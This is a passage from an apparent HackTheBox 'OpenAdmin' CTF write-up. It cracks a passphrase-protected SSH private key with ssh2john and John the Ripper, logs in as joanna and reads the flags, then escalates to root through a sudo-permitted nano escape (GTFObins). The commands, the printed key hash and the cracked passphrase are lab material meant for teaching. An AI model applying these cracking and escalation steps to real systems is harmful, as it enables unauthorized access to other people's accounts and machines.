password protected but we also have a hint to crack it:
<em>Don&rsquo;t forget your &ldquo;ninja&rdquo; password</em>.</p><p>Let&rsquo;s crack it with <a href=https://www.openwall.com/john/>JtR (John the Ripper)</a>:</p><pre tabindex=0><code>$ ssh2john id_rsa
/usr/bin/ssh2john:103: DeprecationWarning: decodestring() is a deprecated alias since Python 3.1, use decodebytes()
  data = base64.decodestring(data)
id_rsa:$sshng$1$16$2AF25344B8391A25A9B318F3FD767D6D$1200$906d14608706c9ac6ea6342a692d9ed47a9b87044b94d72d5b61df25e68a5235991f8bac883f40b539c829550ea5937c69dfd2b4c589f8c910e4c9c030982541e51b4717013fafbe1e1db9d6331c83cca061cc7550c0f4dd98da46ec1c7f460e4a135b6f1f04bafaf66a08db17ecad8a60f25a1a095d4f94a530f9f0bf9222c6736a5f54f1ff93c6182af4ad8a407044eb16ae6cd2a10c92acffa6095441ed63215b6126ed62de25b2803233cc3ea533d56b72d15a71b291547983bf5bee5b0966710f2b4edf264f0909d6f4c0f9cb372f4bb323715d17d5ded5f83117233976199c6d86bfc28421e217ccd883e7f0eecbc6f227fdc8dff12ca87a61207803dd47ef1f2f6769773f9cb52ea7bb34f96019e00531fcc267255da737ca3af49c88f73ed5f44e2afda28287fc6926660b8fb0267557780e53b407255dcb44899115c568089254d40963c8511f3492efe938a620bde879c953e67cfb55dbbf347ddd677792544c3bb11eb0843928a34d53c3e94fed25bff744544a69bc80c4ffc87ffd4d5c3ef5fd01c8b4114cacde7681ea9556f22fc863d07a0f1e96e099e749416cca147add636eb24f5082f9224e2907e3464d71ae711cf8a3f21bd4476bf98c633ff1bbebffb42d24544298c918a7b14c501d2c43534b8428d34d500537f0197e75a4279bbe4e8d2acee3c1586a59b28671e406c0e178b4d29aaa7a478b0258bde6628a3de723520a66fb0b31f1ea5bf45b693f868d47c2d89692920e2898ccd89710c42227d31293d9dad740791453ec8ebfb26047ccca53e0a200e9112f345f5559f8ded2f193feedd8c1db6bd0fbfa5441aa773dd5c4a60defe92e1b7d79182af16472872ab3c222bdd2b5f941604b7de582b08ce3f6635d83f66e9b84e6fe9d3eafa166f9e62a4cdc993d42ed8c0ad5713205a9fc7e5bc87b2feeaffe05167a27b04975e9366fa254adf511ffd7d07bc1f5075d70b2a7db06f2224692566fb5e8890c6e39038787873f21c52ce14e1e70e60b8fca716feb5d0727ac1c355cf633226c993ca2f16b95c59b3cc31ac7f641335d80ff1ad3e672f88609ec5a4532986e0567e169094189dcc82d11d46bf73bc6c48a05f84982aa222b4c0e78b18cceb15345116e74f5fbc55d407ed9ba12559f57f37512998565a54fe77ea2a2224abbddea75a1b6da09ae3ac043b6161809b630174603f33195827d14d0ebd64c6e48e0d0346b469d664f89e2ef0e4c28b6a64acdd3a0edf8a61915a246feb25e8e69b3710916e494d5f482bf6ab65c675f73c39b2c2eecdca6709188c6f36b6331953e3f93e27c987a3743eaa71502c43a807d8f91cdc4dc33f48b852efdc8fcc2647f2e588ae368d69998348f0bfcfe6d65892aebb86351825c2aa45afc2e6869987849d70cec46ba951c864accfb8476d5643e7926942ddd8f0f32c296662ba659e999b0fb0bbfde7ba2834e5ec931d576e4333d6b5e8960e9de46d32daa5360ce3d0d6b864d3324401c4975485f1aef6ba618edb12d679b0e861fe5549249962d08d25dc2dde517b23cf9a76dcf482530c9a34762f97361dd95352de4c82263cfaa90796c2fa33dd5ce1d889a045d587ef18a5b940a2880e1c706541e2b523572a8836d513f6e688444af86e2ba9ad2ded540deadd9559eb56ac66fe021c3f88c2a1a484d62d602903793d10d

$ john --wordlist=/usr/share/wordlists/password/rockyou.txt john.txt
Warning: detected hash type &#34;SSH&#34;, but the string is also recognized as &#34;ssh-opencl&#34;
Use the &#34;--format=ssh-opencl&#34; option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
bloodninjas      (id_rsa)
Warning: Only 1 candidate left, minimum 2 needed for performance.
1g 0:00:00:08 DONE (2020-03-13 17:35) 0.1237g/s 1774Kp/s 1774Kc/s 1774KC/s *7┬íVamos!
Session completed
</code></pre><p>The password is <code>bloodninjas</code> to unlock the private key of joanna.</p><p>We can connect now.</p><h3 id=system-privilege-escalation--joanna-to-root>System Privilege Escalation : joanna to root<a hidden class=anchor aria-hidden=true href=#system-privilege-escalation--joanna-to-root>#</a></h3><p><strong>TL;DR</strong>: nano escape</p><pre tabindex=0><code>$ ssh joanna@10.10.10.171 -i id_rsa
joanna@openadmin:~$ cat user.txt
c9b2cf07d40807e62af62660f0c81b5f

$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
</code></pre><p>EZ pe: escape <code>nano</code> thanks to <a href=https://gtfobins.github.io/>GTFObins</a></p><p>See <a href=https://gtfobins.github.io/gtfobins/nano/>https://gtfobins.github.io/gtfobins/nano/</a>.</p><pre tabindex=0><code># cat /root/root.txt
2f907ed450b361b2c2bf4e8795d5b561
</code></pre></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/easy/>Easy</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>